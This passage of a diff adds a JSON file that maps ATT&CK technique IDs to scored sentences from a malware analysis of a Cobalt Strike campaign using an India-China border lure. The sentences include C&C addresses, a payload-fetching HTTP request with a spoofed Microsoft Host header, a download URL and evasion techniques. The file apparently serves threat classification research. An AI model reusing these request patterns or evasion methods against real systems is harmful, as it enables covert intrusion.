+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.545
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.5406
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.7048
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.7041
+      },
+      {
+        "sentence": "The beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.",
+        "score": 0.3075
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.6825
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.6131
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.4246
+      },
+      {
+        "sentence": "As Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.",
+        "score": 0.3958
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.3568
+      },
+      {
+        "sentence": "But here are few observations.",
+        "score": 0.3421
+      },
+      {
+        "sentence": "The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads.",
+        "score": 0.4743
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.5746
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.5548
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.4375
+      },
+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.4781
+      },
+      {
+        "sentence": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels.",
+        "score": 0.4224
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.5156
+      },
+      {
+        "sentence": "Conclusion Threat actors always try to find ways to blend into real traffic.",
+        "score": 0.3969
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.4401
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.5331
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats.",
+        "score": 0.3845
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.3336
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.4145
+      }
+    ],
+    "T1086": [
+      {
+        "sentence": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks.",
+        "score": 0.3225
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.",
+        "score": 0.3003
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.4135
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.3248
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.3747
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.3707
+      },
+      {
+        "sentence": "Document The document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.",
+        "score": 0.3535
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.3761
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.4861
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.6311
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.4158
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.4324
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.4537
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.6523
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.5404
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.6385
+      },
+      {
+        "sentence": "It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process.",
+        "score": 0.5412
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.6434
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.4295
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.3806
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.3784
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.4401
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.3924
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.439
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.4436
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.512
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.5144
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.3345
+      },
+      {
+        "sentence": "As Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.",
+        "score": 0.4679
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.3206
+      },
+      {
+        "sentence": "But here are few observations.",
+        "score": 0.3168
+      },
+      {
+        "sentence": "The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads.",
+        "score": 0.5119
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.3664
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.319
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.4404
+      },
+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.4826
+      },
+      {
+        "sentence": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels.",
+        "score": 0.3448
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.4161
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3793
+      }
+    ],
+    "T1193": [
+      {
+        "sentence": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks.",
+        "score": 0.4437
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.",
+        "score": 0.6763
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.3804
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.8578
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.4325
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.436
+      },
+      {
+        "sentence": "Document The document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.",
+        "score": 0.4602
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.6394
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.5383
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.411
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.4274
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.3625
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.36
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.4807
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.4448
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.4131
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.3582
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.4069
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.3927
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.3016
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.4199
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.3687
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.4203
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.4386
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.4293
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.4356
+      },
+      {
+        "sentence": "As Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.",
+        "score": 0.3027
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.4057
+      },
+      {
+        "sentence": "The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads.",
+        "score": 0.3526
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.4479
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.4242
+      },
+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.4673
+      },
+      {
+        "sentence": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels.",
+        "score": 0.4167
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.3433
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.4041
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.4055
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats.",
+        "score": 0.3739
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.3498
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3396
+      }
+    ],
+    "T1204": [
+      {
+        "sentence": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks.",
+        "score": 0.3476
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.",
+        "score": 0.7686
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.326
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.6162
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.3136
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.4133
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.4562
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.3846
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.3081
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.3189
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.4205
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.3801
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.3784
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.3073
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.3483
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.3503
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.358
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.3346
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.3584
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.319
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.3297
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.3377
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.3109
+      },
+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.4808
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.3419
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.3451
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3406
+      }
+    ],
+    "T1140": [
+      {
+        "sentence": "The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.",
+        "score": 0.3597
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.4704
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.378
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.3435
+      },
+      {
+        "sentence": "Document The document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.",
+        "score": 0.3202
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.3952
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.5359
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.557
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.5662
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.8042
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.7854
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.645
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.6779
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.4706
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.3642
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.5096
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.4164
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.3404
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.4368
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.7685
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.7615
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.7404
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.6029
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.5176
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.4324
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.3012
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.4898
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.4378
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.3055
+      },
+      {
+        "sentence": "Note: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.",
+        "score": 0.3193
+      },
+      {
+        "sentence": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels.",
+        "score": 0.3042
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.3487
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.3996
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.3652
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.327
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.4133
+      }
+    ],
+    "T1036": [
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.3645
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.3283
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.3536
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.4139
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.3599
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.3423
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.3268
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.3412
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.338
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.3041
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.3
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.3544
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.3433
+      },
+      {
+        "sentence": "Zscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.",
+        "score": 0.3129
+      },
+      {
+        "sentence": "In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels.",
+        "score": 0.3154
+      },
+      {
+        "sentence": "Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.",
+        "score": 0.3863
+      },
+      {
+        "sentence": "Conclusion Threat actors always try to find ways to blend into real traffic.",
+        "score": 0.3905
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.434
+      },
+      {
+        "sentence": "One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.",
+        "score": 0.428
+      }
+    ],
+    "T1043": [
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.524
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.3132
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.313
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.3252
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.3498
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.3377
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.391
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.346
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.3153
+      },
+      {
+        "sentence": "It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process.",
+        "score": 0.4007
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.3313
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.3638
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.5037
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.4771
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.3979
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.3631
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.3776
+      },
+      {
+        "sentence": "The beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.",
+        "score": 0.4089
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.38
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.4133
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.4059
+      },
+      {
+        "sentence": "But the use of a proper GIF header for shellcode seems to be new for them.",
+        "score": 0.3531
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.3447
+      },
